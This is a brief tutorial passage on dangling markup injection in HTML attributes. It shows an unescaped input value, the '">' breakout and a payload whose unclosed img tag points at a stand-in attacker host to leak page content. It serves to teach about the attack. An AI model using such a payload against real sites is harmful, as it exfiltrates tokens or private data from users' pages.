## Dargling Markup Injection

Suppose an application embeds attacker-controllable data into its responses in an unsafe way:

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

Suppose also that the application does not filter or escape the > or " characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context:

```html
">
```

In this situation, an attacker would naturally attempt to perform XSS. But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:

```html
"><img src='//attacker-website.com?
```
